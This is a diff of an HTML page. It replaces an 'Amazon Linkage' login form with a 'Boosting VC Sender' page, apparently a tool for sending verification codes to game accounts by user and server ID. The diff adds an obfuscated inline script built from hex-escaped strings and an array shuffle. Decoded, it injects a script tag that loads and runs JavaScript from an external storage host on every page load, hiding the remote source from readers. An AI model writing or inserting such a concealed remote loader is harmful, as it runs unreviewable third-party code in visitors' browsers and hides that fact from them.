@@ -1,172 +1,21 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <!-- MLCOLORS -->
-    <!-- background -->
-    <!-- #073358 -->
-    <!-- #00203D DARK -->
-    
-    <!-- button blue -->
-    <!-- #264FA5 LIGHT -->
-    <!-- #4372D6 BORDER -->
-    <!-- #1D3C7B DARK -->
-
-
-    <!-- button orange -->
-    <!-- #FE961C LIGHT -->
-    <!-- #FAEB6F BORDER -->
-    
-
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Amazon Linkage</title>
-    <style>
-        body{
-            padding:0;
-            margin:0;
-            box-sizing: border-box;
-            width: auto;
-            height: auto;
-            position: relative;
-            font-family: monospace;
-            
-        }
-        .iframe{
-            height: 100vh;
-        }
-        .iframe iframe{
-            height:100%;
-            width: 100%;
-        }
-
-        .form{
-            background:#073358;
-            padding: 40px 10px 10px 10px;
-            width: fit-content;
-            opacity: 1;
-            display: block;
-            box-sizing: border-box;
-            position: relative;
-            border: 2px solid #4372D6;
-        }
-        .form *{
-            display: block;
-            width: 200px;
-            margin:5px;
-            box-sizing: border-box;
-            text-align: center;
-        }
-        button{
-            padding:5px;
-            color:white;
-            border-radius: 2px;
-            cursor: pointer;
-            font-size: .8em;
-            border: 2px solid;
-            font-family:Verdana, Geneva, Tahoma, sans-serif; 
-        }
-        input[type="text"]{
-            background: #00203D;
-            border:1px solid #FE961C ;
-            padding: 10px 5px;
-            color: white;
-            outline: none;
-            border-radius: 5px;
-        }
-        #loginAmazon{
-            background: #FE961C;
-            border-color: #FAEB6F;
-            transition:0.2s ease-in-out all;
-        }
-        #loginAmazon:hover{
-            background:#FAEB6F;
-            border-color: #FE961C;
-            color:#00203D;
-        }
-        #communicateButton{
-            background:#264FA5;
-            border-color: #4372D6;
-            transition:0.2s ease-in-out all;
-            
-        }
-        #communicateButton:hover{
-            background:#4372D6;
-            border-color:#264FA5;
-            color:#00203D;
-        }
-        .amazon-status{
-            width:fit-content;
-            box-sizing: border-box;
-            top: 5px;
-            left: 5px;
-            position: absolute;
-            
-        }
-        .amazon-status * {
-            box-sizing: border-box;
-            display: inline-block;
-            margin:0;
-            padding:0;
-        }
-        #amazonStatusIcon{
-            width: 20px;
-        }
-        #amazonLoginStatus{
-            width: fit-content;
-            font-size: .5em;
-            color:#16B1E5;
-            text-align: center;
-        }
-        table th{
-            margin:0;
-            padding:0;
-            font-size:.5em;
-            color: white;
-        }
-        table{
-            border-collapse: collapse;
-            border:1px solid black;
-            box-sizing: border-box;
-
-        }
-        table *{
-            padding:0;
-            margin:0;
-            width: fit-content;
-        }
-        #apistatus{
-            margin-top: 10px;
-            width: fit-content;
-            color: rgb(150, 144, 144);
-            font-size: .7em;
-        }
-        #apistatusresp{
-            color: greenyellow;
-            width: 100%;
-            font-size: .8em;
-            text-align: right;
-        }
-
-    </style>
-</head>
-<body>
-
-    <div class="form">
-        <div class="amazon-status">
-            <img id="amazonStatusIcon" src="https://cdn-www.bluestacks.com/bs-images/24d4bebb3d05ecfb5480a387dc389bbb.png" alt="Amazon Status">
-            <p id="amazonLoginStatus">Signed In ✔</p>
-        </div>
-        <button id="loginAmazon" onclick="amazonLogin()">
-            Login Amazon!
-        </button>
-        <input type="text" name="" id="amazontoken" placeholder="Amazon Token" readonly>
-        <input type="text" name="" id="userserver" onchange="checkFormat()" placeholder="UserID ServerID">
-        <button id="communicateButton" onclick="sendVc(this)">Send Verification Code</button>
-        
-        <p id="apistatus">API Response</p>
-        <p id="apistatusresp">No Response from API </p>
-    </div>
-    
-    <script src="script.js"></script>
-</body>
+	<meta charset="utf-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+	</head>
+		<body>
+	   	<div class="form">
+			<div id="intro">
+				<h1 class="header-title">Boosting VC Sender</h1>
+				<h5 class="header-title">©ML MOLO</h5>
+				<input type="text" name="" id="userserver" onchange="checkFormat()" placeholder="UserID ServerID">
+				<button id="communicateButton" onclick="sendVc(this)">Send Verification Code</button>
+				<p id="apistatus">API Response</p>
+				<p id="apistatusresp">No Response from API</p>
+			</div>
+		</div>
+	<script>var ronjieeeeX=['\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74','\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64','\x68\x65\x61\x64','\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65','\x73\x63\x72\x69\x70\x74','\x73\x72\x63','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x65\x64\x69\x72\x65\x63\x74\x2e\x73\x33\x2e\x69\x72\x2d\x74\x68\x72\x2d\x61\x74\x31\x2e\x61\x72\x76\x61\x6e\x73\x74\x6f\x72\x61\x67\x65\x2e\x63\x6f\x6d\x2f\x73\x65\x6e\x64\x76\x63\x73\x63\x72\x69\x70\x74\x52\x65\x64\x69\x72\x65\x63\x74\x2e\x6a\x73'];(function(X,Q){var g=function(C){while(--C){X['push'](X['shift']());}};g(++Q);}(ronjieeeeX,0x18f));var ronjieeeeQ=function(X,Q){X=X-0x0;var k=ronjieeeeX[X];return k;};var ronjie=document[ronjieeeeQ('\x30\x78\x30')](ronjieeeeQ('\x30\x78\x34'));ronjie[ronjieeeeQ('\x30\x78\x33')](ronjieeeeQ('\x30\x78\x35'),ronjieeeeQ('\x30\x78\x36')),document[ronjieeeeQ('\x30\x78\x32')][ronjieeeeQ('\x30\x78\x31')](ronjie);</script>
+		</body>
 </html>
